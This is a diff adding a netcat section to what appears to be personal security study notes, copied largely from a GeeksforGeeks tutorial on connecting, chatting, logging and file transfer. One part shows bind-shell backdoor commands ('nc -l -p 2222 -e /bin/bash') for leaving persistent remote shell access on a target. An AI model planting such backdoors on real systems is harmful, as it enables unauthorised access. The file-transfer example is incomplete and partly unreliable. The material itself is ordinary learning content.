@@ -288,6 +288,85 @@ Studied about common ports (0 - 1024) For example:
 - 3389 for RDP
 - 445 for SMB (Server Message Block - Same as FTP but also allows sharing devices such as printers.)
 - $nc
+##### Netcat:
+
+**for help:**
+```
+nc -h 
+```
+
+**Connecting to a Server:**
+
+```
+nc [Target IP Address] [Target Port]
+nc 192.168.17.43 21
+```
+
+**More from geekforgeeks:**
+
+**Chatting**  
+Netcat can also be used to chat between two users. We need to establish a connection before chatting. To do this we are going to need two devices. One will play the role of initiator and one will be a listener to start the conversation and so once the connection is established, communication can be done from both ends. First of all, we will use Windows 10 machine which will play role of Listener.Second we will use Kali linux machine which will play role of initiator. First, we will have to create a listener. We will use the following command to create a listener: 
+
+```
+nc -lvvp 4444 
+```
+
+where, 
+[-l]: Listen Mode 
+[vv]: Verbose Mode {It can be used once, but we use twice to be more verbose} 
+[p]: Local Port 
+
+how, it’s time to create an initiator, for this we will just provide the IP Address of the System where we started the Listener followed by the port number. 
+
+**NOTE:** Use the same port to create an initiator that was used in creating listener. 
+
+```
+nc 192.168.1.35 4444 
+```
+
+**Creating a backdoor**   
+We can also create a backdoor using NC. To create a backdoor on the target system that we can come back to at any time. Command for attacking a Linux System.   
+
+```
+nc -l -p 2222 -e /bin/bash 
+```
+
+For Creating Backdoor for Windows system.   
+
+```
+nc -l -p 1337 -e hack.exe 
+```
+
+This will open a listener on the system that will pipe the command shell or the Linux bash shell to the connecting system.   
+
+```
+nc 192.168.1.35 2222 
+```
+
+**Verbose mode**   
+In netcat, Verbose is a mode which can be initiated using [-v] parameter. Now verbose mode generates extended information. Basically, we will connect to a server using netcat two times to see the difference between normal and verbose modes.   
+**The command is**
+
+```
+nc 192.168.17.43 21 -v   
+```
+  
+**Save Output to Desktop**   
+For the purpose of the record maintenance, better readability, and future references, we will save the output of the Netcat. To do this we will use the parameter -o of the Netcat to save the output in the text file. 
+
+```
+nc 192.168.17.43 21 -v -o /root/Desktop/Result.txt
+``` 
+
+**File Transfer**   
+Netcat can be used to transfer the file across devices. Here we will create a scenario where we will transfer a file from a Windows system to a Kali Linux system. To send the file from the Windows, we will use the following command.   
+
+```
+nc -v -w 20 -p 8888 -l file.txt 
+```
+
+So, this was a basic guide to netcat. It’s quite an interesting tool to use as well as it is pretty easy.
+
 
 
 ---
